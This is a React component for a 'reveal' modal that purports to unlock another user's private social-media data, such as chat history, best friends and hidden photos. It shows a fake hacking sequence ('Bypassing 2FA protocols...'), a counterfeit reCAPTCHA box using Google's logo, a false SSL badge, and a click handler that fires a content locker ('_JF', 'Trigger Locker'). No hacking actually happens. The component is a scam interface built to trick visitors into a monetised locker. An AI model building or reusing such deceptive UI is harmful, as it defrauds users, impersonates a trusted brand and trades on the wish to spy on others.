import React, { useEffect, useState } from 'react';
import { X, Lock, Eye, MessageCircle, UserPlus, Users, Fingerprint, Smartphone, Cpu, Loader2, Check } from 'lucide-react';
import { Feature, FeatureType } from '../types';

interface RevealModalProps {
  isOpen: boolean;
  onClose: () => void;
  feature: Feature | null;
  targetUser: string;
}

type ViewState = 'LOADING' | 'PREVIEW' | 'PROCESSING' | 'VERIFICATION';

const RevealModal: React.FC<RevealModalProps> = ({ isOpen, onClose, feature, targetUser }) => {
  const [view, setView] = useState<ViewState>('LOADING');
  const [processProgress, setProcessProgress] = useState(0);
  const [processStep, setProcessStep] = useState(0);
  
  // Captcha State
  const [captchaState, setCaptchaState] = useState<'IDLE' | 'CHECKING' | 'VERIFIED'>('IDLE');

  // Processing text steps
  const processSteps = [
    "Establishing secure connection...",
    "Bypassing 2FA protocols...",
    "Extracting cloud cache...",
    "Decrypting media fragments...",
    "Reassembling data packets...",
    "Verifying integrity..."
  ];

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('LOADING');
      setProcessProgress(0);
      setProcessStep(0);
      setCaptchaState('IDLE');
      
      // Simulate initial data fetch
      const timer = setTimeout(() => {
        setView('PREVIEW');
      }, 1500); 
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Processing Simulation Logic
  useEffect(() => {
    if (view === 'PROCESSING') {
      const totalDuration = 5000; // 5 seconds processing
      const intervalTime = 50;
      const steps = totalDuration / intervalTime;
      let currentStep = 0;

      const timer = setInterval(() => {
        currentStep++;
        const progress = Math.min((currentStep / steps) * 100, 100);
        setProcessProgress(progress);

        // Update text steps based on progress chunks
        const textIndex = Math.floor((progress / 100) * processSteps.length);
        setProcessStep(Math.min(textIndex, processSteps.length - 1));

        if (currentStep >= steps) {
          clearInterval(timer);
          setTimeout(() => setView('VERIFICATION'), 400);
        }
      }, intervalTime);

      return () => clearInterval(timer);
    }
  }, [view]);

  if (!isOpen || !feature) return null;

  const handleStartProcessing = () => {
    setView('PROCESSING');
  };

  const handleCaptchaClick = () => {
    if (captchaState !== 'IDLE') return;
    
    setCaptchaState('CHECKING');
    
    // Simulate network check
    setTimeout(() => {
        setCaptchaState('VERIFIED');
        
        // Trigger Locker
        setTimeout(() => {
            if (typeof (window as any)._JF === 'function') {
                (window as any)._JF();
            } else {
                console.warn("_JF function not found");
            }
        }, 500);
    }, 1500);
  };

  // --------------------------------------------------------------------------
  // RENDER HELPERS
  // --------------------------------------------------------------------------

  const renderContentPreview = () => {
    switch (feature.id) {
      case FeatureType.SCORE_CHECKS:
        return (
          <div className="space-y-3 w-full">
            {[1, 2, 3].map((i) => (
              <div key={i} className="flex items-center gap-3 bg-white dark:bg-slate-800 p-3 rounded-xl shadow-sm border border-gray-100 dark:border-slate-700 blur-[4px]">
                <div className="w-10 h-10 bg-gray-200 dark:bg-slate-600 rounded-full" />
                <div className="flex-1">
                  <div className="h-2.5 w-24 bg-gray-200 dark:bg-slate-600 rounded mb-2" />
                  <div className="h-2 w-16 bg-gray-100 dark:bg-slate-700 rounded" />
                </div>
              </div>
            ))}
          </div>
        );
      case FeatureType.BEST_FRIENDS:
        return (
          <div className="grid grid-cols-4 gap-3 w-full">
            {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
              <div key={i} className="flex flex-col items-center gap-1 blur-[4px]">
                 <div className="w-12 h-12 bg-gray-200 dark:bg-slate-700 rounded-full border-2 border-white dark:border-slate-600 shadow-sm" />
              </div>
            ))}
          </div>
        );
      case FeatureType.EYES_ONLY:
        return (
            <div className="grid grid-cols-2 gap-2 w-full">
                {[1, 2, 3, 4].map((i) => (
                    <div key={i} className="aspect-[4/5] bg-gray-200 dark:bg-slate-700 rounded-xl overflow-hidden relative border border-gray-100 dark:border-slate-700">
                         <div className="w-full h-full bg-gradient-to-br from-gray-200 to-gray-300 dark:from-slate-700 dark:to-slate-800 blur-[8px]" />
                    </div>
                ))}
            </div>
        );
      case FeatureType.CHAT_HISTORY:
        return (
            <div className="space-y-4 w-full px-2 py-2">
                <div className="flex gap-2 items-end blur-[5px]">
                    <div className="w-8 h-8 rounded-full bg-gray-200 dark:bg-slate-700"></div>
                    <div className="bg-gray-100 dark:bg-slate-700 rounded-2xl rounded-bl-none px-4 py-3 max-w-[80%] h-10"></div>
                </div>
                 <div className="flex gap-2 items-end flex-row-reverse blur-[5px]">
                    <div className="w-8 h-8 rounded-full bg-gray-200 dark:bg-slate-700"></div>
                    <div className="bg-blue-50 dark:bg-blue-900/30 rounded-2xl rounded-br-none px-4 py-3 max-w-[80%] h-14"></div>
                </div>
            </div>
        );
      default:
        return null;
    }
  };

  const getModalIcon = () => {
      switch (feature.id) {
          case FeatureType.SCORE_CHECKS: return <Users className="w-8 h-8 text-yellow-600 dark:text-yellow-400" />;
          case FeatureType.BEST_FRIENDS: return <UserPlus className="w-8 h-8 text-purple-600 dark:text-purple-400" />;
          case FeatureType.EYES_ONLY: return <Eye className="w-8 h-8 text-indigo-600 dark:text-indigo-400" />;
          case FeatureType.CHAT_HISTORY: return <MessageCircle className="w-8 h-8 text-green-500 dark:text-green-400" />;
          default: return <Lock className="w-8 h-8 text-gray-500" />;
      }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
      {/* Backdrop */}
      <div 
        className="absolute inset-0 bg-black/60 backdrop-blur-md transition-opacity duration-300"
        onClick={() => view !== 'PROCESSING' && onClose()}
      />

      {/* Modal Card */}
      <div className="relative w-full max-w-md bg-white dark:bg-[#1e293b] rounded-t-[32px] sm:rounded-3xl p-6 shadow-2xl animate-slide-up sm:animate-pop-in mb-0 sm:mb-4 mx-0 sm:mx-4 overflow-hidden border-t border-white/20 dark:border-slate-700 transition-colors duration-300">
        
        {view !== 'PROCESSING' && view !== 'VERIFICATION' && (
            <button 
                onClick={onClose}
                className="absolute top-5 right-5 text-gray-300 hover:text-gray-500 dark:text-slate-600 dark:hover:text-slate-400 p-2 active:scale-95 transition-transform"
            >
                <X size={24} />
            </button>
        )}

        <div className="flex flex-col items-center pt-2 min-h-[400px]">
            
          {/* VIEW: INITIAL LOADING */}
          {view === 'LOADING' && (
             <div className="flex-1 flex flex-col items-center justify-center w-full">
                <div className="relative">
                    <div className="w-16 h-16 rounded-full border-4 border-gray-100 dark:border-slate-700"></div>
                    <div className="absolute inset-0 w-16 h-16 rounded-full border-4 border-transparent border-t-yellow-400 animate-spin"></div>
                </div>
                <h3 className="text-lg font-bold text-gray-800 dark:text-white mt-8 mb-2">Analyzing Request</h3>
                <p className="text-gray-400 dark:text-slate-500 text-sm">Handshaking with server...</p>
             </div>
          )}

          {/* VIEW: PREVIEW (READY TO REVEAL) */}
          {view === 'PREVIEW' && (
            <>
                <div className="mb-6 p-4 rounded-2xl bg-gray-50 dark:bg-slate-800/50 ring-1 ring-gray-100 dark:ring-slate-700">
                    {getModalIcon()}
                </div>

                <h2 className="text-2xl font-black text-gray-800 dark:text-white text-center mb-2 tracking-tight">
                    {feature.title}
                </h2>
                
                <p className="text-gray-500 dark:text-slate-400 text-sm text-center mb-8 px-4 leading-relaxed">
                   Hidden data found for <span className="text-gray-800 dark:text-gray-200 font-bold">@{targetUser}</span>. <br/> Reveal to decrypt content.
                </p>

                {/* Blurred Content Container */}
                <div className="w-full relative bg-gray-50/50 dark:bg-slate-900/50 rounded-2xl p-4 mb-8 border border-gray-100 dark:border-slate-800 overflow-hidden">
                    {renderContentPreview()}
                    
                    {/* Overlay with Lock */}
                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/60 dark:bg-slate-900/60 backdrop-blur-[4px] z-10 transition-all hover:backdrop-blur-[2px]">
                        <div className="bg-white dark:bg-slate-800 p-3.5 rounded-full shadow-lg mb-3 ring-4 ring-gray-50 dark:ring-slate-800/50">
                            <Lock className="w-6 h-6 text-gray-800 dark:text-white" />
                        </div>
                        <span className="text-[10px] font-bold text-gray-600 dark:text-gray-300 uppercase tracking-widest bg-white/80 dark:bg-slate-800/80 px-4 py-1.5 rounded-full shadow-sm border border-gray-100 dark:border-slate-700">Encrypted</span>
                    </div>
                </div>

                <div className="w-full space-y-4">
                    <button 
                        onClick={handleStartProcessing}
                        className="w-full bg-gray-900 hover:bg-black dark:bg-white dark:hover:bg-gray-100 text-white dark:text-slate-900 font-bold text-lg py-4 rounded-xl shadow-xl shadow-gray-200 dark:shadow-slate-900/20 active:scale-[0.98] transition-all duration-200 flex items-center justify-center gap-2"
                    >
                        <span>Reveal Data</span>
                    </button>
                </div>
            </>
          )}

          {/* VIEW: PROCESSING (SYSTEM SIMULATION) */}
          {view === 'PROCESSING' && (
            <div className="w-full flex-1 flex flex-col items-center justify-center py-6">
                
                <div className="relative w-24 h-24 mb-10">
                    <div className="absolute inset-0 bg-yellow-400/20 dark:bg-yellow-400/10 rounded-full animate-ping"></div>
                    <div className="absolute inset-0 border-2 border-yellow-400 rounded-full opacity-20"></div>
                    <div className="absolute inset-0 rounded-full flex items-center justify-center bg-white dark:bg-slate-800 shadow-xl border border-gray-100 dark:border-slate-700 relative overflow-hidden">
                         <Cpu className="text-yellow-500 w-10 h-10 relative z-10 animate-pulse" />
                         <div className="absolute inset-0 bg-gradient-to-t from-yellow-50/50 to-transparent dark:from-yellow-900/10" />
                    </div>
                </div>

                <div className="w-full max-w-xs space-y-2 mb-8">
                    <div className="flex justify-between text-xs font-bold text-gray-400 dark:text-slate-500 uppercase tracking-wider">
                        <span>Progress</span>
                        <span>{Math.round(processProgress)}%</span>
                    </div>
                    <div className="w-full bg-gray-100 dark:bg-slate-700 rounded-full h-2.5 overflow-hidden">
                        <div 
                            className="h-full bg-yellow-400 transition-all duration-100 ease-out relative"
                            style={{ width: `${processProgress}%` }}
                        >
                            <div className="absolute inset-0 bg-white/30 w-full h-full animate-[shimmer_1s_infinite]"></div>
                        </div>
                    </div>
                </div>

                <div className="h-8 flex items-center justify-center">
                    <span className="text-sm font-medium text-gray-600 dark:text-gray-300 animate-fade-in-up key={processStep}">
                        {processSteps[processStep]}
                    </span>
                </div>
            </div>
          )}

          {/* VIEW: VERIFICATION (TRUSTED UI) */}
          {view === 'VERIFICATION' && (
            <div className="w-full flex-1 flex flex-col items-center animate-pop-in pt-4 justify-center">
                <div className="w-16 h-16 bg-gray-50 dark:bg-slate-800 rounded-2xl flex items-center justify-center mb-4 shadow-inner ring-1 ring-gray-100 dark:ring-slate-700">
                    <Fingerprint className="w-8 h-8 text-gray-800 dark:text-white" strokeWidth={1.5} />
                </div>
                
                <h2 className="text-xl font-black text-gray-900 dark:text-white mb-1 text-center">
                    Security Check
                </h2>
                <p className="text-gray-500 dark:text-slate-400 text-center text-xs mb-6 max-w-[280px] leading-relaxed">
                    Please complete the verification to unlock the results.
                </p>

                {/* FAKE RECAPTCHA COMPONENT */}
                <div 
                    onClick={handleCaptchaClick}
                    className="bg-[#f9f9f9] border border-[#d3d3d3] rounded-[3px] w-[302px] h-[74px] p-3 flex items-center shadow-sm cursor-pointer select-none mb-6 hover:bg-[#f0f0f0] transition-colors"
                >
                    <div className="flex items-center justify-center w-[28px] h-[28px] bg-white border border-[#c1c1c1] rounded-[2px] mr-3">
                         {captchaState === 'IDLE' && <div />}
                         {captchaState === 'CHECKING' && <Loader2 className="w-5 h-5 text-blue-500 animate-spin" />}
                         {captchaState === 'VERIFIED' && <Check className="w-6 h-6 text-green-500" />}
                    </div>
                    <div className="text-[14px] font-normal text-black font-sans">I'm not a robot</div>
                    <div className="ml-auto flex flex-col items-center justify-center w-[70px]">
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-8 h-8 opacity-70" alt="" />
                        <div className="text-[10px] text-[#555] mt-1 text-center leading-none">reCAPTCHA</div>
                        <div className="text-[8px] text-[#555] text-center leading-none mt-0.5">Privacy - Terms</div>
                    </div>
                </div>

                <div className="mt-2 flex items-center gap-2 px-3 py-1.5 bg-gray-50 dark:bg-slate-800/50 rounded-lg">
                    <Smartphone className="w-3.5 h-3.5 text-gray-400 dark:text-slate-500" />
                    <span className="text-[10px] font-medium text-gray-400 dark:text-slate-500">
                        Secure 256-bit SSL Connection
                    </span>
                </div>

                 <button 
                    onClick={onClose}
                    className="mt-6 text-gray-400 dark:text-slate-500 text-xs font-medium hover:text-gray-600 p-2"
                >
                    Cancel Request
                </button>
            </div>
          )}

        </div>
      </div>
    </div>
  );
};

export default RevealModal;